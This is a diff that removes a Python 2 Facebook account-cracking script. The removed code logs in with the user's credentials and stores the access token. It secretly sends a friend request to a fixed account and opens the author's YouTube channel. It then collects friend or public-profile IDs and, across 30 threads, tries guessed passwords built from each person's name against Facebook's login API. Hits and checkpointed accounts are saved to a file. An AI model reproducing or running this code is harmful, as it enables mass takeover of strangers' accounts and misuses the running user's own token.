-		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
-		print('	' )
-		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
-		pwd = raw_input('\033[1;97m[+] \x1b[1;97mPassword\x1b[1;97m    : \x1b[1;97m')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\x1b[1;97mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\033[1;47m\033[1;91mBinyamin_jan Login Successful\033[1;0m'
-				os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\x1b[1;97m∆CP∆ Creat A New Account")
-			os.system(' xdg - open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\x1b[1;97mPassword/Email is wrong")
-			os.system('xdg - open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
-			time.sleep(1)
-			login()
-			
-def menu():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"\x1b[1;94mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(o.text)
-		nama = a['name']
-		id = a['id']
-                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
-                b = json.loads(t.text)
-                sub = str(b['summary']['total_count'])
-	except KeyError:
-		os.system('clear')
-		print"\033[1;97m∆CP∆Creat A New Account"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	except requests.exceptions.ConnectionError:
-		print"\x1b[1;94mThere is no internet connection"
-		keluar()
-	os.system("clear") #Dev:Binyamin
-	print logo
-	print "\033[1;37m[!]\033[1;91m Logged in User Information\033[1;92m"
-	time.sleep(0.05)
-	print "\033[1;37m[•]\033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
-	time.sleep(0.05)
-	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
-	time.sleep(0.05)
-	print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
-	print "\033[1;92m[1]\033[1;47m\033[1;31mStart Hacking                             \033[1;0m"
-	time.sleep(0.05)
-	print "\033[1;93m[2]\033[1;47m\033[1;31mID Not Found Problem Solve                     \033[1;0m"
-	time.sleep(0.05)
-	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update Binyamin_jan                          \033[1;0m"
-	time.sleep(0.05)
-	print "\033[1;95m[0]\033[1;47m\033[1;31mExit                                      \033[1;0m"
-	time.sleep(0.05)
-	pilih()
-
-
-def pilih():
-	unikers = raw_input("\n\033[1;31mSelect Option: \033[1;91m")
-	if unikers =="":
-		print "\x1b[1;91mFill in correctly"
-		pilih()
-        elif unikers =="1":		
-	        super()
-	elif unikers =="2":
-		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
-	        menu()
-	elif unikers =="3":
-		os.system('clear')
-		print logo
-		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
-                jalan('\033[1;91m=10%')
-                jalan("\033[1;92m==20%")
-                jalan('\033[1;93m===30%')
-                jalan('\033[1;94m====40%')
-                jalan("\033[1;95m=====50%")
-                jalan("\033[1;96m======60%")
-                jalan('\033[1;97m=======70%')
-                jalan('\033[1;96m========80%')
-                jalan('\033[1;95m=========90%')
-                jalan('\033[1;94m==========100%')
-                jalan('\033[1;93mCloning Data Reset and update by Binyamin_jan')
-		os.system('git pull origin master')
-		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-	        menu()		
-	elif unikers =="0":
-		jalan('Token Removed')
-		os.system('rm -rf login.txt')
-		keluar()
-	else:
-		print "\x1b[1;91mFill in correctly"
-		pilih()
-def pilih():
-	unikers = raw_input("\n\033[1;91mChoose an Option: \033[1;97m")
-	if unikers =="":
-		print "\x1b[1;91mFill in correctly"
-		pilih()
-	elif unikers =="1":
-		super()
-	elif unikers =="2":
-		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
-	        menu()
-	elif unikers =="3":
-		os.system('clear')
-		print logo
-		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
-                jalan('\033[1;91m=10%')
-                jalan("\033[1;92m==20%")
-                jalan('\033[1;93m===30%')
-                jalan('\033[1;94m====40%')
-                jalan("\033[1;95m=====50%")
-                jalan("\033[1;96m======60%")
-                jalan('\033[1;97m=======70%')
-                jalan('\033[1;96m========80%')
-                jalan('\033[1;95m=========90%')
-                jalan('\033[1;94m==========100%')
-                jalan('\033[1;93mCloning Data Reset and update by Binyamin')
-		os.system('git pull origin master')
-		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-	        menu()		
-	elif unikers =="0":
-		jalan('Token Removed')
-		os.system('rm -rf login.txt')
-		keluar()
-	else:
-		print "\x1b[1;91mFill in correctly"
-		pilih()
-
-
-def super():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	print logo
-	print "\033[1;97m[1]\033[1;47m\033[1;91mClone From Friend List    \033[1;0m"
-	time.sleep(0.05)
-	print "\033[1;97m[2]\033[1;47m\033[1;91mClone From Public Id \033[1;0m"
-	time.sleep(0.05)
-	print "\033[1;97m[0]\033[1;47m\033[1;91mBack                     \033[1;0m"
-	time.sleep(0.05)
-	pilih_super()
-
-def pilih_super():
-	peak = raw_input("\n\033[1;97m[+]\033[1;91mSelect Option: \033[1;97m")
-	if peak =="":
-		print "\x1b[1;91mFill in correctly"
-		pilih_super()
-	elif peak =="1":
-		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
-		print logo
-		jalan('\033[1;97m[+]\033[1;91mBinyamin_jan█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif peak =="2":
-		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
-		print logo
-		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;97m[+]\033[1;91mName\033[1;97m:\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;97m[+]\x1b[1;91mID Not Found!"
-			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-			super()
-		print"\033[1;97m[+]\033[1;91mBinyamin_Jan█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:"
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif peak =="0":
-		menu()
-	else:
-		print "\x1b[1;91mFill in correctly"
-		pilih_super()
 	
-	print "\033[1;97m[+]\033[1;91mTotal Accounts\033[1;97m: \033[1;97m"+str(len(id))
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\033[1;97m[+]\033[1;31mHacking Has Been Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
-	print "\n\033[1;97m[+]\x1b[1;31mStop Process Press CTRL+Z"
-	print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
- 	
-			
-	def main(arg):
-		global oks
-		user = arg
-		try:
-			os.mkdir('out')
-		except OSError:
-			pass #Dev:Binyamin
-		try:													
-			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
-			b = json.loads(a.text)												
-			pass1 = b['first_name'] + '123'												
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			q = json.load(data)												
-			if 'access_token' in q:
-				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				z = json.loads(x.text)
-				print '\x1b[1;91m[!] \x1b[1;92m[OK]'											
-				print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
-				print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
-				print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'											
-				oks.append(user+pass1)
-                        else:
-			        if 'www.facebook.com' in q["error_msg"]:
-				    print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
-				    print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b ['name']
-				    print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				    print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'
-				    cek = open("out/super_cp.txt", "a")
-				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
-				    cek.close()
-				    cekpoint.append(user+pass1)
-                                else:
-				    pass2 = b['first_name'] + '1234'										
-                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			            q = json.load(data)												
-			            if 'access_token' in q:	
-				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				            z = json.loads(x.text)
-				            print '\x1b[1;94m[!] \x1b[1;92m[OK]'											
-				            print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
-				            print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user								
-				            print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'											
-				            oks.append(user+pass2)
-                                    else:
-			                   if 'www.facebook.com' in q["error_msg"]:
-				               print '\x1b[1;94m[!] \x1b[1;96m[Checkpoint]'
-				               print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;93m    : \x1b[1;97m' + b['name']
-				               print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				               print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'
-				               cek = open("out/super_cp.txt", "a")
-				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
-				               cek.close()
-				               cekpoint.append(user+pass2)								
-				           else:											
-					       pass3 = b['last_name']+'123'										
-					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
-					       q = json.load(data)										
-					       if 'access_token' in q:	
-						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                       z = json.loads(x.text)
-						       print '\x1b[1;91m[!] \x1b[1;92m[OK]'								
-						       print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']									
-						       print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user							
-						       print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'									
-						       oks.append(user+pass3)
-                                               else:
-			                               if 'www.facebook.com' in q["error_msg"]:
-				                           print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
-				                           print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                           print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				                           print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'
-				                           cek = open("out/super_cp.txt", "a")
-				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
-				                           cek.close()
-				                           cekpoint.append(user+pass3)									
-					               else:										
-						           pass4 = b['first_name'] + '1122'											
-			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			                                   q = json.load(data)												
-			                                   if 'access_token' in q:		
-						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                   z = json.loads(x.text)
-				                                   print '\x1b[1;94m[!] \x1b[1;92m[OK]'											
-				                                   print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
-				                                   print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
-				                                   print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'											
-				                                   oks.append(user+pass4)
-                                                           else:
-			                                           if 'www.facebook.com' in q["error_msg"]:
-				                                       print '\x1b[1;94m[!] \x1b[1;96m[Checkpoint]'
-				                                       print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                                       print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				                                       print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'
-				                                       cek = open("out/super_cp.txt", "a")
-				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
-				                                       cek.close()
-				                                       cekpoint.append(user+pass4)					
-					                           else:									
-						                       pass5 = '786786'							
-						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
-						                       q = json.load(data)								
-						                       if 'access_token' in q:	
-						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                               z = json.loads(x.text)
-						                               print '\x1b[1;97m[!] \x1b[1;92m[OK]'						
-						                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']							
-						                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user					
-						                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'							
-						                               oks.append(user+pass5)	
-                                                                       else:
-			                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                   print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
-				                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				                                                   print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'
-				                                                   cek = open("out/super_cp.txt", "a")
-				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
-				                                                   cek.close()
-				                                                   cekpoint.append(user+pass5)					
-						                               else:								
-							                           pass6 = '100200'											
-			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			                                                           q = json.load(data)												
-			                                                           if 'access_token' in q:	
-								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                           z = json.loads(x.text)
-				                                                           print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
-				                                                           print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
-				                                                           print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user									
-				                                                           print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'											
-				                                                           oks.append(user+pass6)
-                                                                                   else:
-			                                                                   if 'www.facebook.com' in q["error_msg"]:
-				                                                               print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
-				                                                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                                                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				                                                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'
-				                                                               cek = open("out/super_cp.txt", "a")
-				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
-				                                                               cek.close()
-				                                                               cekpoint.append(user+pass6)	
-						                                           else:							
-								                               pass7 = b['first_name']+'12345'						
-								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
-								                               q = json.load(data)						
-								                               if 'access_token' in q:		
-				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                                       z = json.loads(x.text)
-									                               print '\x1b[1;91m[!] \x1b[1;92m[OK]'					
-									                               print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']					
-									                               print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user				
-									                               print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'					
-									                               oks.append(user+pass7)
-                                                                                               else:
-			                                                                               if 'www.facebook.com' in q["error_msg"]:
-				                                                                           print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
-				                                                                           print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                                                                           print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				                                                                           print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'
-				                                                                           cek = open("out/super_cp.txt", "a")
-				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
-				                                                                           cek.close()
-				                                                                           cekpoint.append(user+pass7)           					
-								                                       else:						
-										                           pass8 = b['last_name'] + '786'							
-			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			                                                                                   q = json.load(data)												
-			                                                                                   if 'access_token' in q:		
-										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                                                   z = json.loads(x.text)
-				                                                                                   print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
-				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
-				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user										
-				                                                                                   print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'											
-				                                                                                   oks.append(user+pass8)
-                                                                                                           else:
-			                                                                                           if 'www.facebook.com' in q["error_msg"]:
-				                                                                                       print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
-				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;98m      : \x1b[1;97m' + user
-				                                                                                       print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'
-				                                                                                       cek = open("out/super_cp.txt", "a")
-				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
-				                                                                                       cek.close()
-				                                                                                       cekpoint.append(user+pass8)   	
-										                                   else:					
-										                                       pass9 = b['first_name'] + '786'					
-										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
-										                                       q = json.load(data)				
-										                                       if 'access_token' in q:		
-		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                                                               z = json.loads(x.text)
-											                                       print '\x1b[1;91m[!] \x1b[1;92m[OK]'			
-											                                       print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']			
-											                                       print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user	
-											                                       print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'			
-											                                       oks.append(user+pass9)
-                                                                                                                       else:
-			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                                                                   print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
-				                                                                                                   print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                                                                                                   print '\x1b[1;94m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
-				                                                                                                   print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'
-				                                                                                                   cek = open("out/super_cp.txt", "a")
-				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
-				                                                                                                   cek.close()
-				                                                                                                   cekpoint.append(user+pass9)		
-																	
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-#Dev:Binyamin
-        print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
-	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
-	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;97m«-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------»"
-	print """
- \033[1;97m
-\033[1;97m ██████╗  ██████╗  █████╗     ██╗     ██╗   ██╗ ██████╗██╗  ██╗
-\033[1;97m██╔════╝ ██╔═══██╗██╔══██╗    ██║     ██║   ██║██╔════╝██║ ██╔╝
-\033[1;97m██║  ███╗██║   ██║╚█████╔╝    ██║     ██║   ██║██║     █████╔╝ 
-\033[1;97m██║   ██║██║   ██║██╔══██╗    ██║     ██║   ██║██║     ██╔═██╗ 
-\033[1;97m╚██████╔╝╚██████╔╝╚█████╔╝    ███████╗╚██████╔╝╚██████╗██║  ██╗
-\033[1;97m ╚═════╝  ╚═════╝  ╚════╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
-                                            
-\033[1;91m ██████╗ ██████╗  ██████╗ ██████╗ ███████╗██████╗ ██████╗ ███████╗ ██╗ ██╗██╗  ██╗
-\033[1;92m██╔═████╗╚════██╗██╔═████╗╚════██╗╚════██║╚════██╗╚════██╗██╔════╝███║███║██║  ██║
-\033[1;93m██║██╔██║ █████╔╝██║██╔██║ █████╔╝    ██╔╝ █████╔╝ █████╔╝███████╗╚██║╚██║███████║
-\033[1;94m████╔╝██║ ╚═══██╗████╔╝██║ ╚═══██╗   ██╔╝  ╚═══██╗ ╚═══██╗╚════██║ ██║ ██║╚════██║
-\033[1;95m╚██████╔╝██████╔╝╚██████╔╝██████╔╝   ██║  ██████╔╝██████╔╝███████║ ██║ ██║     ██║
-\033[1;96m ╚═════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝  ╚═════╝ ╚═════╝ ╚══════╝ ╚═╝ ╚═╝     ╚═╝      
-"""
-	print "\033[1;97m«-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------»"
-	raw_input("\n\033[1;97m[+]\033[1;97mBack")
-	menu()
+	
 
-if __name__ == '__main__':
-	login()
-gin()
+
+
+
+   
+    
+    
+    
+
+
+
+
+
+
+
+ 
+
+
+
+
+		
+		
+		
+
+	
+
+
+	
+	
+
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+        	                
+		
+
+	
+	
+
+	
+	
+
+		
+			
+
+		
+
+                
+               
+                
+                
+               
+                
+
+
+		
+		
+	        		
+	
+		 
+		
+
+
+
+													
+											
+
+
+	
+
+
+
+
+
 
